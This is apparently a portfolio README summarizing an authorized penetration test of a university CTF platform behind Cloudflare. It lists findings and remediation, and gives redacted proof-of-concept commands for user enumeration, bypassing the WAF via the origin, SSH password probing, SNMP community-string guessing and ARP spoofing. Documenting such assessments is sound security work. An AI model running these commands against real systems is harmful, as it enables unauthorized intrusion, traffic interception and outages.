<div align="center">

# 🔐 AUPP CTF Platform — Full Security Assessment
**A real-world authorized penetration test across external and internal attack surfaces**

[![Language](https://img.shields.io/badge/Language-Python%203-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Shell](https://img.shields.io/badge/Shell-Bash-4EAA25?style=for-the-badge&logo=gnu-bash&logoColor=white)](https://www.gnu.org/software/bash/)
[![Framework](https://img.shields.io/badge/Target-CTFd-FF0000?style=for-the-badge&logo=dependabot&logoColor=white)](https://ctfd.io)
[![CDN](https://img.shields.io/badge/CDN-Cloudflare-F38020?style=for-the-badge&logo=cloudflare&logoColor=white)](https://cloudflare.com)
[![Target](https://img.shields.io/badge/Target-ctf.auppstaging.com-6A1B9A?style=for-the-badge&logo=firefoxbrowser&logoColor=white)](https://ctf.auppstaging.com/)
[![Status](https://img.shields.io/badge/Status-Completed-2E7D32?style=for-the-badge&logo=checkmarx&logoColor=white)](https://github.com)
[![Sessions](https://img.shields.io/badge/Sessions-6-1565C0?style=for-the-badge&logo=buffer&logoColor=white)](https://github.com)
[![Findings](https://img.shields.io/badge/Findings-26-B71C1C?style=for-the-badge&logo=bugsnag&logoColor=white)](https://github.com)

<br/>

> ⚠️ **Confidentiality Notice:** Specific vulnerability details, request payloads, and finding specifics are redacted.
> All target references use `<TARGET>` and `<SESSION>` placeholders.
> This repository is for portfolio and methodology documentation only.
>
> ✅ **Authorization:** All testing was conducted under a signed scope document issued by the platform owner.

</div>

---

## 📋 Overview

A structured six-session security assessment of a university-hosted CTF web platform, conducted under full authorization from the American University of Phnom Penh. The engagement covered both the **external attack surface** (Sessions 1–5, through Cloudflare CDN/WAF) and the **internal origin server** (Session 6, on-site with direct access). The two phases together reveal a platform whose security posture is heavily dependent on a single layer — Cloudflare — and what happens when that layer is removed.

| Field | External (Sessions 1–5) | Internal (Session 6) |
|---|---|---|
| 🎯 **Attack Surface** | External — through Cloudflare CDN/WAF | Internal — direct origin server access |
| 📅 **Date** | April 20–23, 2026 | April 23, 2026 |
| 🌐 **Traffic Path** | Internet → Cloudflare → Origin | Campus LAN → Origin (redacted) |
| 📡 **Requests** | 4,000+ | 38 test cases + load/DDoS simulation |
| 🔍 **Access Level** | Black-box / Grey-box | On-site, direct VLAN access |
| 📊 **Findings** | 16 | 10 |

---

## 🗂️ Scope

### External Scope (Sessions 1–5)
**✅ In Scope**
- Web application (authenticated and unauthenticated)
- REST API endpoints (`/api/v1/*`)
- Session and cookie security
- Business logic and access control
- Static file delivery and challenge infrastructure
- HTTP security headers and SSL/TLS configuration
- Availability and load resilience (single-source simulation)

**❌ Out of Scope**
- Internal network / LAN infrastructure
- Physical access
- Social engineering
- Distributed denial-of-service using real botnets

### Internal Scope (Session 6)
**✅ In Scope**
- Origin server direct access (bypassing Cloudflare)
- Network reconnaissance of server and gateway VLANs
- SSH authentication testing
- Wireless network security (AP isolation, ARP spoofing)
- Gateway management interface exposure
- Internal load and DDoS simulation against origin

**❌ Out of Scope**
- Other university systems outside the CTF platform VLAN
- Physical infrastructure beyond network layer
- Student account data or competition flags

---

## 🧪 Methodology

Testing followed the **OWASP Testing Guide v4** across six progressive sessions.

### 🔍 Session 1 — Reconnaissance & Application Security
- Attack surface mapping and endpoint enumeration
- Unauthenticated and authenticated API testing
- Access control validation across all routes
- Challenge infrastructure testing

### 🔐 Session 2 — Authentication & Session Security
- Login brute-force and rate limiting analysis
- Session fixation and cookie security review
- API parameter tampering
- Business logic testing (scoring, hints, flag submission)

### 📈 Session 3 — Load & Stress Testing
- Single-user baseline measurement across all endpoints
- Concurrent user ramp (up to 100 simultaneous users)
- Login endpoint stress testing
- Scoreboard and API endpoint polling under load
- **1,304 HTTP requests** across 6 test scenarios

### 🏗️ Session 4 — Infrastructure & Injection Testing
- HTTP security header analysis
- SSL/TLS configuration review
- SQL injection, NoSQL injection, SSTI testing
- Cross-site scripting (stored, reflected, DOM)
- Subdomain enumeration and DNS analysis
- Sensitive file and directory discovery
- **47 test cases** across 8 categories

### 💥 Session 5 — DDoS / Availability Simulation
- Spike burst test (T-07: 200 concurrent users)
- Sustained load test (T-08: 150 users, 60 seconds, 2,141 requests)
- Escalating API endpoint flood (T-09: 3 waves, 300 requests)
- Slowloris-style slow-header attack (T-10: 50 connections)
- POST endpoint flood (T-11: 100 concurrent write requests)
- Post-test full recovery verification (T-12)

### 🏢 Session 6 — Internal Network Assessment (On-Site)
- Internal IP discovery and nmap port scanning of origin and gateway
- Split-horizon DNS verification (internal vs external resolution)
- Direct HTTPS access to origin bypassing Cloudflare — re-testing all external attack vectors without WAF
- SSH password authentication probing (multiple accounts)
- ARP spoofing MITM attempt — AP client isolation verification
- Gateway management interface discovery (Winbox, SNMP)
- Internal load testing: wrk ramp (1–100 connections), Apache Bench (1,000 requests at 100 concurrent)
- Internal DDoS simulation: same T-07 to T-12 scenario set against origin directly
- **38 test cases** across 6 categories

---

## 🛠️ Tools Used

| Tool | Phase | Purpose |
|---|---|---|
| ![curl](https://img.shields.io/badge/curl-073551?style=flat&logo=curl&logoColor=white) | Both | HTTP request crafting, Host header injection, response timing |
| ![nmap](https://img.shields.io/badge/nmap-0E83CD?style=flat&logo=nmap&logoColor=white) | Both | Port scanning, service detection, SSL/TLS enumeration |
| ![Python](https://img.shields.io/badge/Python_3-3776AB?style=flat&logo=python&logoColor=white) | Both | Custom load tester, DDoS simulator (concurrent.futures, threading) |
| ![ffuf](https://img.shields.io/badge/ffuf-black?style=flat&logo=windowsterminal&logoColor=white) | External | Directory and endpoint bruteforce |
| `wrk` | Internal | HTTP benchmark with p50/p90/p99 latency percentiles |
| `Apache Bench (ab)` | Internal | 1,000-request load test with full connection time breakdown |
| `dig` / `nslookup` | Both | DNS enumeration, split-horizon verification |
| `arpspoof` / `tcpdump` | Internal | ARP spoofing MITM attempt, packet capture |
| `ssh` | Internal | Password authentication probing on origin server |
| `snmpwalk` | Internal | SNMP community string enumeration against gateway |
| `mitmproxy` / Browser DevTools | External | Traffic inspection, cookie and header analysis |
| `netcat` / `pwntools` | External | Low-level connection testing |

> All custom scripts were written from scratch for this engagement.

---

## 📊 Findings Summary

**26 findings identified across 6 sessions.**

| Severity | External | Internal | Total | Badge |
|---|---|---|---|---|
| Critical | 0 | 1 | 1 | ![Critical](https://img.shields.io/badge/Critical-1-B71C1C?style=flat) |
| High | 1 | 2 | 3 | ![High](https://img.shields.io/badge/High-3-E65100?style=flat) |
| Medium | 5 | 5 | 10 | ![Medium](https://img.shields.io/badge/Medium-10-F57F17?style=flat) |
| Low | 5 | 1 | 6 | ![Low](https://img.shields.io/badge/Low-6-2E7D32?style=flat) |
| Informational | 5 | 1 | 6 | ![Info](https://img.shields.io/badge/Informational-6-1565C0?style=flat) |

> 📄 Full finding details, CVSS scores, proof-of-concept commands, and remediation guidance are documented in the confidential reports delivered to the client.

### 🗂️ Finding Categories

| Category | External | Internal |
|---|---|---|
| 🔑 Access Control | API endpoint authorization gaps | Cloudflare WAF fully bypassed via direct origin |
| 🔓 Authentication | Login rate limiting too permissive | SSH password auth enabled on origin server |
| 🍪 Session Security | Cookie Secure attribute missing | — |
| 🔍 Information Disclosure | Docker image names, Teams API routing | — |
| 🌐 Network Exposure | — | Gateway management interfaces exposed to student VLAN |
| 🐳 Container Security | Challenge container instability | — |
| 🛡️ HTTP Security | Missing CSP, Permissions-Policy, HTTPS redirect | — |
| ⚡ Availability | Response degradation under load; API pool exhaustion | 20× degradation; nginx connection pool exhaustion |
| 🐢 Performance | Slow baseline response times | Scoreboard 14.8s without Cloudflare cache |
| 🔥 DDoS Resilience | Slowloris fully blocked (Cloudflare) | Slowloris 80% effective on raw origin |

---

## 🔑 Key Finding — Cloudflare Dependency

The most significant insight from combining both assessment phases: **the platform's security posture is almost entirely dependent on Cloudflare remaining in the traffic path.**

| Attack | External (Through Cloudflare) | Internal (Direct Origin) |
|---|---|---|
| Slowloris (50 connections) | **0 / 50 held — fully blocked** | **40 / 50 held — 80% effective** |
| Login brute-force | HTTP 429 after ~5 attempts | No rate limiting — all requests succeed |
| WAF / injection filters | Active — payloads blocked | Absent — origin exposed directly |
| Scoreboard response time | ~600ms (edge cache) | ~14,800ms — 25× slower |
| DDoS avg latency (200 concurrent) | ~4,400ms — degraded but live | ~8,400ms — 2× worse, errors appear |
| SSH access from network | Not applicable | Password auth open to campus network |
| Gateway management interfaces | Not applicable | Open to student VLAN — no firewall restriction |

Application-layer controls — CSRF, SQL injection, SSTI, session management, admin access control — held correctly under both internal and external testing. The application itself is well-built. The weakness is entirely in infrastructure hardening and origin server exposure.

---

## 🔬 Proof of Concept

> All PoCs use `<TARGET>` for the redacted domain, `<SESSION>` for authenticated session tokens, and `<ORIGIN>` for the redacted internal IP.

---

### 📌 F-01 — User Enumeration via Sequential IDs *(External / Access Control)*

The `/api/v1/users/{id}` endpoint is publicly accessible without authentication. Sequential integer IDs allow full participant enumeration with no credentials.

```bash
for id in $(seq 1 15); do
  echo -n "ID $id: "
  curl -sk https://<TARGET>/api/v1/users/$id \
    | python3 -c "import sys,json; d=json.load(sys.stdin).get('data',{}); \
                  print(d.get('name','—'), '|', d.get('score','—'))"
done
```
```
ID <n>:  <redacted>  | 0
ID <n>:  <redacted>  | 100
ID <n>:  <redacted>  | 100
# All IDs returned HTTP 200 with username and score — no auth required
```

---

### 📌 F-03 — Challenge File Token Bypass *(External / Access Control)*

Challenge files include a signed HMAC token in the URL. Any authenticated session can download files without supplying the token — the signature is never validated server-side.

```bash
# Without session — correctly rejected
curl -sk -o /dev/null -w "%{http_code}" \
  "https://<TARGET>/files/<hash>/<filename>"
# → 403

# With session cookie, token omitted — file returned
curl -sk -o /dev/null -w "%{http_code}" \
  -H "Cookie: session=<SESSION>" \
  "https://<TARGET>/files/<hash>/<filename>"
# → 200  (1821 bytes — HMAC token not enforced server-side)
```

---

### 📌 F-04 — Internal Docker Image Names Exposed via API *(External / Information Disclosure)*

The authenticated challenge API includes a `docker_image` field leaking exact internal image names and tags, allowing offline analysis before interacting with live instances.

```bash
curl -sk -H "Cookie: session=<SESSION>" \
  https://<TARGET>/api/v1/challenges/<id> | python3 -m json.tool | grep docker
```
```json
"docker_image": "<redacted>:latest",
"docker_image": "<redacted>:latest"
# Internal registry names exposed — no version pinning (:latest tag)
```

---

### 📌 F-06 + F-12 — Missing Secure Cookie & No HTTPS Redirect *(External / Session Security)*

Session cookie missing the `Secure` attribute combined with port 80 serving content without redirecting to HTTPS — together creating a viable session interception path for a network attacker.

```bash
# Cookie attribute check
curl -ski https://<TARGET>/login | grep -i set-cookie
# set-cookie: session=<value>; HttpOnly; Path=/; SameSite=Lax
# Secure: MISSING  ←  cookie transmittable over plaintext HTTP

# HTTP redirect check
curl -sI http://<TARGET>/ | head -3
# HTTP/1.1 200 OK  ←  should be 301 Moved Permanently to HTTPS
```

---

### 📌 F-09 — Login Rate Limiting Bypass Window *(External / Authentication)*

Cloudflare rate limiting is active on `/login` but the threshold is too permissive — at 10 concurrent attempts, 0% are blocked, creating a full credential stuffing bypass window.

```bash
python3 loadtest.py  # T-03 login stress scenario
```
```
[T-03] Login endpoint stress (10 → 30 concurrent)
  10 concurrent:   0 / 10 blocked   (0% block rate)   ← full bypass
  20 concurrent:   4 / 20 blocked   (~20% block rate)
  30 concurrent:  18 / 30 blocked   (~60% block rate)
# Attacker operating at 10–15 concurrent bypasses rate limiting entirely
```

---

### 📌 F-11 — Missing Content-Security-Policy Header *(External / HTTP Security)*

No CSP header on any endpoint — no browser-level XSS mitigation in place. Any injected script executes without restriction.

```bash
curl -sI https://<TARGET>/ | grep -i -E "content-security|permissions-policy|x-frame|x-content"
```
```
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
strict-transport-security: max-age=31536000; includeSubDomains
Content-Security-Policy:   MISSING
Permissions-Policy:        MISSING
```

---

### 📌 S6-02 — Cloudflare WAF Fully Bypassed via Direct Origin *(Internal / Access Control)*

Split-horizon DNS resolves the platform to the origin IP internally. Direct HTTPS access bypasses all Cloudflare WAF, rate limiting, and DDoS protections entirely.

```bash
# Internal DNS resolution — confirms split-horizon
dig <TARGET> @<INTERNAL-DNS>
# ANSWER: <TARGET>  →  <ORIGIN-IP>  (internal origin, not Cloudflare)

# Direct origin access — Cloudflare headers absent
curl -sk -o /dev/null -w "%{http_code}  cf-ray: %header{cf-ray}" \
  -H "Host: <TARGET>" https://<ORIGIN>/
# → 200  cf-ray: (absent)  ←  Cloudflare not in path

# External DNS for comparison
dig <TARGET> @8.8.8.8
# ANSWER: <TARGET>  →  <CLOUDFLARE-IP>
```

---

### 📌 S6-03 — SSH Password Authentication Enabled on Origin *(Internal / Authentication)*

SSH port 22 is open on the origin server and accepts password-based authentication from the student network — enabling unrestricted brute-force attempts from any campus device.

```bash
ssh <redacted>@<ORIGIN>
# <redacted>@<ORIGIN>'s password:  ←  password auth accepted (VULNERABLE)

# Expected hardened response:
# Permission denied (publickey)  ←  key-only auth enforced
```

---

### 📌 S6-05 + S6-06 — Gateway Management Interfaces Exposed to Student VLAN *(Internal / Network Exposure)*

The MikroTik gateway exposes its Winbox management interface (TCP 8291) and SNMP (UDP 161) directly to the student VLAN with no firewall restriction.

```bash
nmap -p 8291 -sU -p 161 <GATEWAY>
```
```
PORT      STATE  SERVICE
8291/tcp  open   winbox   ←  management interface, no firewall restriction
161/udp   open   snmp     ←  accessible from student VLAN

# SNMP community string enumeration — all standard strings rejected
for str in public private <redacted> admin; do
  snmpwalk -v2c -c $str <GATEWAY> sysDescr 2>&1 | grep -v Timeout || echo "$str: rejected"
done
# All tested strings: Timeout (custom string or ACL in place)
```

---

### 📌 S6-01 vs T-10 — Slowloris: The Cloudflare Dependency in One Command *(Internal vs External)*

The same attack, same tool, same 50 connections — completely different outcome depending on whether Cloudflare is in the path. This single finding captures the entire architectural risk of the engagement.

```bash
# External (Session 5 — through Cloudflare):
# Connections held:   0 / 50  (0%)
# Platform status:    Fully operational — unaffected
curl -sk -o /dev/null -w "%{http_code}  %{time_total}s" https://<TARGET>/
# → 200  0.388s

# Internal (Session 6 — direct origin, no Cloudflare):
# Connections held:  40 / 50  (80%)
# Platform status:   Degraded — significant latency increase
```

---

### 📌 S6-10 — AP Client Isolation Confirmed *(Internal / Positive Control)*

ARP spoofing attempted against a target device on the same VLAN. Despite successful ARP table poisoning, tcpdump captured zero data packets — AP client isolation blocks all Layer 2 client-to-client traffic.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i <iface> -t <TARGET-DEVICE> <GATEWAY> &
arpspoof -i <iface> -t <GATEWAY> <TARGET-DEVICE> &
tcpdump -i <iface> host <TARGET-DEVICE> -c 50
```
```
0 packets captured
0 packets received by filter
# ARP table poisoned — but no traffic flows between clients
# AP client isolation confirmed active ✅
```

---

### 📌 F-08 + F-15 + S6-07 — Response Degradation: All Three Phases *(Both / Availability)*

Load and DDoS results across all three test phases showing progressive degradation and the internal amplification effect without Cloudflare's connection management.

```
External — Session 3 (through Cloudflare)
──────────────────────────────────────────────────────
  Baseline (1 user)       avg:   600ms   p95:   900ms
  @ 60 concurrent         avg:  1766ms   p95:  3200ms
  @ 100 concurrent        avg:  2406ms   p95:  4285ms   max:  5128ms

External — Session 5 DDoS Simulation
──────────────────────────────────────────────────────
  T-07  Spike (200 concurrent)
        avg:  4433ms   p95:  6663ms   errors: 0.0%
  T-08  Sustained (150 users, 60s)
        avg:  4359ms   p95:  7157ms   errors: 0.0%
  T-09  API Flood (300 requests, 3 waves)
        avg:  9043ms   p95: 35670ms   errors: 40.0%
        12 × connection pool exhaustion at peak concurrency

Internal — Session 6 (direct origin, no Cloudflare)
──────────────────────────────────────────────────────
  Baseline (1 user)       avg:    55ms  (wrk keep-alive)
  @ 100 concurrent (wrk)  avg:  1130ms   39% timeout rate
  Apache Bench connect max:       19,619ms  ← TCP handshake alone = pool exhaustion
  T-07  Spike (200 concurrent)
        avg:  8437ms   p95: 19435ms   errors:  5.0%  (2× worse than external)
  T-09  API Flood
        avg:  9043ms   p95: 35670ms   errors: 40.0%  (same pool exhaustion)
  T-10  Slowloris
        40 / 50 connections held (80%)  ←  0% externally
```

---

## ✅ Positive Security Controls Verified

29 controls confirmed correctly implemented across both phases.

| Control | External | Internal |
|---|---|---|
| 🔒 Admin panel access control | ✅ Pass | ✅ Pass |
| 🔒 CSRF nonce enforcement on all write endpoints | ✅ Pass | ✅ Pass (application layer, no WAF) |
| 🔒 SQL injection, SSTI, NoSQL injection | ✅ Blocked | ✅ Blocked (ORM only, no WAF) |
| 🔒 XSS stored and reflected | ✅ Blocked | ✅ Blocked |
| 🔒 Session invalidated server-side on logout | ✅ Pass | — |
| 🔒 Score tampering and mass assignment | ✅ Blocked | — |
| 🔒 Slowloris attack | ✅ Mitigated (Cloudflare) | ❌ 80% effective on origin |
| 🔒 Full platform recovery after all DDoS tests | ✅ < 10 seconds | ✅ < 10 seconds |
| 🔒 AP client isolation — MITM not feasible | — | ✅ 0 packets captured |
| 🔒 Application auth enforced on raw origin | — | ✅ 302/401 without valid session |
| 🔒 No persistent data damage after all tests | ✅ Verified | ✅ Verified |

---

## 💡 Key Takeaway

The platform demonstrates a **strong application security baseline** — no critical application vulnerabilities were found externally, and all application-layer controls held under direct internal testing without the WAF. The application is defensively written.

The primary risk is **architectural**: security is concentrated in a single external layer (Cloudflare). The three highest-priority fixes — `client_header_timeout` in nginx, `PasswordAuthentication no` in sshd_config, and Cloudflare Authenticated Origin Pulls — each require a single configuration line and can be implemented without downtime.

---

## 📁 Repository Structure

```
📦 AUPP-CTF-Platform-Security-Assessment
├── 📄 README.md
├── 🐍 scripts/
│   ├── ddos_sim.py         ← DDoS availability simulation (T-07 to T-12)
│   └── loadtest.py         ← Load & stress testing tool (T-01 to T-06)
└── 🚫 .gitignore
```

---

## 📦 Deliverables

- ✅ Session 6 internal penetration test report (DOCX)
- ✅ Consolidated full external report — Sessions 1–5 (DOCX + PDF)
- ✅ DDoS simulation script (`ddos_sim.py`)
- ✅ Load testing script (`loadtest.py`)
- ✅ Session 4 test plan (47 test cases)
- ✅ Session 6 test checklist (38 test cases)

---

## 👤 Author

<div align="center">

**Eav Puthcambo**
<br/>
AUPP Cybersecurity Programme
<br/>
American University of Phnom Penh

[![GitHub](https://img.shields.io/badge/GitHub-MoriartyPuth--Labs-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/MoriartyPuth-Labs)

</div>
